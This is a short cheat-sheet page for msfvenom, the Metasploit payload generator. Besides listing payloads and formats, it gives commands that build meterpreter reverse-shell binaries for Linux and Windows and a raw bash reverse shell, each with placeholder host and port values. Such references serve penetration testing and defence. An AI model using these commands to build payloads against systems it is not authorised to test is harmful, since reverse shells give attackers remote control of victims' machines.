# msfvenom

> Manually generate payloads for metasploit.
> More information: <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>.

- List payloads:

`msfvenom -l payloads`

- List formats:

`msfvenom -l formats`

- Show payload options:

`msfvenom -p {{payload}} --list-options`

- Create an ELF binary with a reverse TCP handler:

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f elf -o {{path/to/binary}}`

- Create an EXE binary with a reverse TCP handler:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe -o {{path/to/binary.exe}}`

- Create a raw bash with a reverse TCP handler:

`msfvenom -p cmd/unix/reverse_bash LHOST={{local_ip}} LPORT={{local_port}} -f raw`
